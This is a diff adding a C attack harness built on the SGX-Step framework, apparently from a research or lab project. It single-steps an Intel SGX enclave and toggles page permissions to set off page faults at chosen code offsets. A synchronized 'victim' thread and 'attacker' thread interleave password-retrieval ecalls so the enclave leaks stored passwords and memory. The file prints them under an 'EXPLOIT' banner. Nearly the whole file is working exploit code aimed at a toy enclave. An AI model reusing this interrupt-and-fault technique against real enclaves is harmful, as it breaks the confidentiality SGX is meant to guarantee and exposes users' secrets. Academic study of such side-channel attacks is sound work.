@@ -1,0 +1,432 @@
+/* utility headers */
+
+#include <sys/mman.h>
+#include <signal.h>
+#include "sgx-step/libsgxstep/apic.h"
+#include "sgx-step/libsgxstep/cpu.h"
+#include "sgx-step/libsgxstep/pt.h"
+#include "sgx-step/libsgxstep/sched.h"
+#include "sgx-step/libsgxstep/elf_parser.h"
+#include "sgx-step/libsgxstep/enclave.h"
+#include "sgx-step/libsgxstep/debug.h"
+#include "sgx-step/libsgxstep/config.h"
+#include "sgx-step/libsgxstep/idt.h"
+#include "sgx-step/libsgxstep/config.h"
+#include "sgx-step/libsgxstep/cache.h"
+#include <string.h>  // For memcpy
+#include "Enclave/encl_u.h"  // For test_dummy
+
+/* SGX untrusted runtime */
+#include <sgx_urts.h>
+#include "Enclave/encl_u.h"
+#include <pthread.h>
+#include "mystruct.h"
+
+
+#define DO_TIMER_STEP      0
+int irq_cnt = 0, do_irq = 0, fault_cnt = 0, trigger_cnt = 0, step_cnt = 0;
+uint64_t *pte_encl = NULL, *pte_trigger = NULL, *pmd_encl = NULL;
+void *code_adrs, *trigger_adrs;
+
+// THREADING INIT
+int turn = 0; // 0 for thread_A, 1 for thread_B
+int threadBinterrupted = 0;
+pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
+pthread_cond_t cond = PTHREAD_COND_INITIALIZER;
+int single_stepping = 1;
+
+// pointers to memcmp and strncmp and free
+void* sha_pt;
+void* memcmp_pt;
+void* memcmp_page_start;
+void* sha_page_start;
+
+
+ static char password1[64] = "password1";
+    static char password2[64] = "password2";
+    static char password3[64] = "password3";
+    static char password4[64] = "password4";
+
+    
+sgx_enclave_id_t create_enclave(void)
+{
+    sgx_launch_token_t token = {0};
+    int updated = 0;
+    sgx_enclave_id_t eid = -1;
+
+    info_event("Creating enclave...");
+    SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/1,
+                                    &token, &updated, &eid, NULL ) );
+
+    return eid;
+}
+void ocall_print(const char *str)
+{
+    info("ocall_print: enclave says: '%s'", str);
+}
+
+// !!! pointer a has to be uint64_t and not char*
+void ocall_print_address(const char *str, uint64_t a)
+{
+    info("ocall_print_address: enclave says: '%s' '%p'",str, (void*)a);
+}
+
+void ocall_print_password(const char *pw) {
+    printf("Decrypted password: %s\n", pw);
+}
+/* ================== ATTACKER IRQ/FAULT HANDLERS ================= */
+
+/* Called before resuming the enclave after an Asynchronous Enclave eXit. */
+void aep_cb_func(void)
+{
+    info("aep");
+    printf("Thread %lu is executing\n", (unsigned long)pthread_self());
+    step_cnt++;
+    printf("stepcnt %d\n", step_cnt);
+    uint64_t erip = edbgrd_erip() - (uint64_t) get_enclave_base();
+    info("^^ enclave RIP=%#llx", erip);
+
+    
+    if(erip == 0x3330){ // logout between line 38 and 39
+        info("testreach");
+        sgx_step_do_trap = 0;
+        single_stepping = 0;
+
+        //change thread to writer thread B
+        pthread_mutex_lock(&lock);
+        turn = 1; // set turn to thread B
+        pthread_cond_signal(&cond); // Wake up thread_B
+        while(turn != 0){
+            pthread_cond_wait(&cond, &lock);
+        }
+        pthread_mutex_unlock(&lock); //end turn of thread A
+
+    }
+
+    
+    if((fault_cnt == 7)){ // logout between line 38 and 39
+        fault_cnt++;
+        info("testreach2");
+        threadBinterrupted = 1;
+
+        attacker_config_page_table();
+         // CHANGE FROM THREAD B TO THREAD A
+        pthread_mutex_lock(&lock);
+        turn = 0; // set turn to thread A  
+        pthread_cond_signal(&cond); // Wake up thread_A
+        while(turn != 1){
+            pthread_cond_wait(&cond, &lock);
+        }
+        pthread_mutex_unlock(&lock); //end turn of thread B
+
+
+    }
+
+
+    
+
+
+
+
+}
+
+/* Called upon SIGSEGV caused by untrusted page tables. */
+void fault_handler(int signo, siginfo_t * si, void  *ctx)
+{
+
+    info("pf handler");
+    void *fault_page = (void *)((uintptr_t)si->si_addr & ~(4096 - 1));
+
+
+    ucontext_t *uc = (ucontext_t *) ctx;
+
+    switch ( signo )
+    {
+      case SIGSEGV:
+        ASSERT(fault_cnt++ < 100);
+        printf("faultcnt %d\n", fault_cnt);
+        info("Caught page fault (base address=%p)", si->si_addr);
+        
+
+    
+        if (si->si_addr == trigger_adrs && single_stepping)
+        {
+            info("Restoring trigger access rights..");
+            
+            ASSERT(!mprotect(trigger_adrs, 4096, PROT_READ | PROT_EXEC));
+            do_irq = 1;
+
+            #if !DO_TIMER_STEP
+                sgx_step_do_trap = 1;
+            #endif
+        }
+        else
+        {
+            if(threadBinterrupted){
+                if(fault_page == trigger_adrs){
+                    if (mprotect(trigger_adrs, 4096, PROT_READ | PROT_EXEC) != 0) {
+                        perror("mprotect failed");
+                    }else{
+                        printf("access rights restored on trigger_adrs\n");
+                    }
+                }
+                if(fault_page == sha_page_start){
+                    if (mprotect(sha_page_start, 4096, PROT_READ | PROT_EXEC) != 0) {
+                        perror("mprotect failed");
+                    }else{
+                        printf("access rights restored on sha\n");
+                    }
+                }
+            }else{
+                if(fault_page == trigger_adrs){
+                    if (mprotect(trigger_adrs, 4096, PROT_READ | PROT_EXEC) != 0) {
+                        perror("mprotect failed");
+                    }else{
+                        printf("access rights restored on trigger_adrs\n");
+                    }
+                    // revoke execute permission on strncmp()
+                    if (mprotect(sha_page_start, 4096, PROT_NONE) != 0) {
+                        perror("mprotect failed");
+                    }else{
+                        printf("access rights revoked on sha\n");
+                    }
+                
+                }
+
+                if(fault_page == sha_page_start){
+                    if (mprotect(sha_page_start, 4096, PROT_READ | PROT_EXEC) != 0) {
+                        perror("mprotect failed");
+                    }else{
+                        printf("access rights restored on sha\n");
+                    }
+                    // revoke execute permission on strncmp()
+                    if (mprotect(trigger_adrs, 4096, PROT_NONE) != 0) {
+                        perror("mprotect failed");
+                    }else{
+                        printf("access rights revoked on trigger_adrs\n");
+                    }
+                
+                }
+            }
+
+        }
+    
+        break;
+
+    #if !DO_TIMER_STEP
+      case SIGTRAP:
+            
+        info("Caught single-step trap (RIP=%p)\n", si->si_addr);
+        
+
+        /* ensure RFLAGS.TF is clear to disable debug single-stepping */
+        uc->uc_mcontext.gregs[REG_EFL] &= ~0x100;
+        break;
+    #endif
+
+      default:
+        info("Caught unknown signal '%d'", signo);
+        abort();
+    }
+
+    // NOTE: return eventually continues at aep_cb_func and initiates
+    // single-stepping mode.
+}
+
+
+
+/* ================== ATTACKER INIT/SETUP ================= */
+
+void register_signal_handler(int signo)
+{
+    struct sigaction act, old_act;
+
+    /* Specify #PF handler with signinfo arguments */
+    memset(&act, 0, sizeof(sigaction));
+    act.sa_sigaction = fault_handler;
+    act.sa_flags = SA_RESTART | SA_SIGINFO;
+
+    /* Block all signals while the signal is being handled */
+    sigfillset(&act.sa_mask);
+    ASSERT(!sigaction( signo, &act, &old_act ));
+}
+
+/* Configure and check attacker untrusted runtime environment. */
+void attacker_config_runtime(void)
+{
+    ASSERT( !claim_cpu(VICTIM_CPU) );
+    //ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) ); //VRAAG in die write(file, w)
+    //print_system_settings();
+
+    register_enclave_info();
+    print_enclave_info();
+    register_signal_handler( SIGSEGV );
+}
+
+/* Provoke page fault on enclave entry to initiate single-stepping mode. */
+void attacker_config_page_table(void)
+{
+    code_adrs = get_enclave_base() + get_symbol_offset("ecall_clear_all");
+    trigger_adrs = (void *)((size_t)code_adrs & ~(4096 - 1));
+
+
+    info("enclave trigger at %p; code at %p", trigger_adrs, code_adrs);
+
+    
+    ASSERT(!mprotect(trigger_adrs, 4096, PROT_NONE ));
+
+    //VRAAG WAT NOG HIER
+    
+}
+
+// Function for thread A
+void* victim_thread(void* arg) {
+
+    // locking for turn, sync logic, thread A sleeps until thread B does a page fault
+    pthread_mutex_lock(&lock);
+    while (turn != 0) { // Wait until it's thread_A's turn
+        pthread_cond_wait(&cond, &lock);
+    }
+    pthread_mutex_unlock(&lock);
+    printf("victim thread running\n");   
+
+    const char* masterpw = "super_secret";
+    sgx_enclave_id_t eidarg = *(sgx_enclave_id_t*)arg;
+
+    ecall_setup(eidarg);
+    //ecall_get_passwords2(eidarg, masterpw);
+
+     /* 1. Setup attack execution environment. */
+    register_symbols("./Enclave/encl.so");
+    attacker_config_runtime();
+    attacker_config_page_table();
+    register_aep_cb(aep_cb_func);
+
+    register_signal_handler( SIGTRAP );
+    set_debug_optin();
+  
+
+    
+   
+    
+    struct my_struct output = {
+        .array_len = 4,
+        .pw_len = 64,
+        .passwords = {password1, password2, password3, password4}
+    };
+
+    
+    ecall_get_passwords2(eidarg, masterpw, &output);
+    
+
+    int rv = 1;
+    ecall_get_debug(eidarg, &rv);
+    printf("threadAfinished\n");
+    printf("debug%d\n", rv);
+
+
+    for (int i = 0; i < output.array_len; ++i) {
+        printf("Password %d: %s\n", i, output.passwords[i]);
+    }
+
+    
+
+}
+
+// Function for thread B
+
+void* attacker_thread(void* arg) {
+    // locking for turn, sync logic, thread B sleeps until thread A does amount of page fault
+    pthread_mutex_lock(&lock);
+    while (turn != 1) { // Wait until it's thread_B's turn
+        pthread_cond_wait(&cond, &lock);
+    }
+    pthread_mutex_unlock(&lock);
+
+    printf("attacker thread running\n");
+
+
+    
+    void* encl_base_addr = get_enclave_base();
+    info("encl base address: '%p'", encl_base_addr);
+
+    void* offset_memcmp = 0x119c0;
+    void* offset_sha = 0x12730;
+
+
+    memcmp_pt = encl_base_addr + (uint64_t) offset_memcmp;
+    sha_pt = encl_base_addr + (uint64_t) offset_sha;   
+
+    memcmp_page_start = (void *)((size_t)memcmp_pt & ~(4096 - 1));
+    sha_page_start = (void *)((size_t)sha_pt & ~(4096 - 1));
+
+
+    sgx_enclave_id_t eidarg = *(sgx_enclave_id_t*)arg;
+
+
+
+    int* debug_addr = (int*) (encl_base_addr + 0x25340);
+
+    struct my_struct output = {
+        .array_len = 4,
+        .pw_len = 64,
+        .passwords = {debug_addr, password2, password3, password4}
+    };
+
+    if (mprotect(sha_page_start, 4096, PROT_NONE) != 0) {
+        perror("mprotect failed");
+    }else{
+        printf("access rights revoked on sha\n");
+    }
+
+    ecall_get_passwords2(eidarg, "dummy", &output);
+
+    printf("testjegens");
+    for (int i = 0; i < output.array_len; ++i) {
+        printf("Password %d: %s\n", i, output.passwords[i]);
+    }
+}
+
+
+int main( int argc, char **argv )
+{
+
+    //Create Enclave
+    sgx_enclave_id_t eid = create_enclave();
+    int rv = 1, secret = 1;
+
+   
+
+
+
+  
+
+    // Create 2 threads
+    pthread_t t1, t2;
+    pthread_create(&t1, NULL, victim_thread, (void*)&eid);
+    pthread_create(&t2, NULL, attacker_thread, (void*)&eid);
+
+    pthread_join(t1, NULL);
+    printf("main running\n");
+
+
+    struct my_struct output = {
+        .array_len = 4,
+        .pw_len = 64,
+        .passwords = {password1, password2, password3, password4}
+    };
+
+    ecall_get_passwords2(eid, "dummy", &output);
+
+    printf("EXPLOIT\n");
+    for (int i = 0; i < output.array_len; ++i) {
+        printf("Password %d: %s\n", i, output.passwords[i]);
+    }  
+    //pthread_join(t2, NULL);
+
+
+
+    
+
+}
+
